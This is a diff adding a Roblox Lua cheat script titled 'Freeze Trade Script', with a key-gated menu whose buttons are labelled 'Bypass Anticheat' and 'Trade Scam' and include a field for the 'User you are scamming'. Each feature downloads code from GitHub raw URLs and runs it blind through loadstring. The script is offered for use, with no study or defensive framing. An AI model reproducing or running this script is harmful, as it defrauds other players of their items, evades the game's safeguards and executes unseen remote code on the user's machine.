@@ -1,0 +1,133 @@
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Create the UI Window
+local Window = Rayfield:CreateWindow({
+    Name = "🔥 Freeze Trade Script 🔥",
+    LoadingTitle = "Loading Gui ...",
+    LoadingSubtitle = "Made by the man himself  DHubOnTop",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "MyScriptData",
+        FileName = "UserSettings"
+    },
+    Discord = {
+        Enabled = false, -- Discord auto-join is now disabled
+        Invite = "", 
+        RememberJoins = false
+    },
+    KeySystem = true,
+    KeySettings = {
+        Title = "Script Key System",
+        Subtitle = "Enter your key below or get it from Discord",
+        Note = "Find the key in our Discord or visit the key website",
+        FileName = "KeyData",
+        SaveKey = false,
+        GrabKeyFromSite = false,
+        Key = {"DHubOnTop"} -- Change to your actual key
+    }
+})
+
+-- Create the Key System Tab
+local KeyTab = Window:CreateTab("Key System", 4483362458)
+KeyTab:CreateSection("Enter Your Key")
+
+-- Input Box for Key Entry
+local UserInputKey = ""
+local KeyBox = KeyTab:CreateInput({
+    Name = "Enter Key",
+    PlaceholderText = "Paste Key Here",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(value)
+        UserInputKey = value
+    end
+})
+
+-- Button to Submit Key
+KeyTab:CreateButton({
+    Name = "Submit Key",
+    Callback = function()
+        if UserInputKey == "DHubOnTop" then -- Change to match your key
+            Rayfield:Notify({
+                Title = "Success",
+                Content = "Key Accepted! Loading script...",
+                Duration = 3,
+                Image = 4483362458
+            })
+            wait(2)
+            LoadMainScript() -- Loads the main script
+        else
+            Rayfield:Notify({
+                Title = "Invalid Key",
+                Content = "Key is in Pastebin!",
+                Duration = 3,
+                Image = 4483362458
+            })
+        end
+    end
+})
+
+-- Button to Get Key (Copy Link)
+KeyTab:CreateButton({
+    Name = "Get Key from Website",
+    Callback = function()
+        setclipboard("https://pastebin.com/raw/YOURPASTEBINID")
+        Rayfield:Notify({
+            Title = "Key Link Copied!",
+            Content = "Paste it in your browser to open.",
+            Duration = 5,
+            Image = 4483362458
+        })
+    end
+})
+
+-- Function to Load the Main Script After Key Verification
+function LoadMainScript()
+    local MainTab = Window:CreateTab("Main", 4483362458) -- Main features tab
+    MainTab:CreateSection("Script Features")
+
+    -- Bypass Anticheat Button
+    MainTab:CreateButton({
+        Name = "Bypass Anticheat (Wait 5 min to bypass)",
+        Callback = function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/AdoptGui'))()
+        end
+    })
+
+    -- Trade Scam Toggle
+    MainTab:CreateToggle({
+        Name = "Trade Scam",
+        CurrentValue = false,
+        Callback = function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Mm2'))()
+        end
+    })
+
+    -- Input Box for User
+    MainTab:CreateInput({
+        Name = "User you are scamming",
+        PlaceholderText = "Type here...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
+        end
+    })
+
+    -- Label
+    MainTab:CreateLabel("Made with ❤️ by DHubOnTop")
+
+    -- Notify User
+    Rayfield:Notify({
+        Title = "Script Activated",
+        Content = "Made with ❤️ by DHubOnTop",
+        Duration = 5,
+        Image = 4483362458,
+        Actions = {
+            Ignore = {
+                Name = "OK",
+                Callback = function()
+                    print("User dismissed notification")
+                end
+            }
+        }
+    })
+end
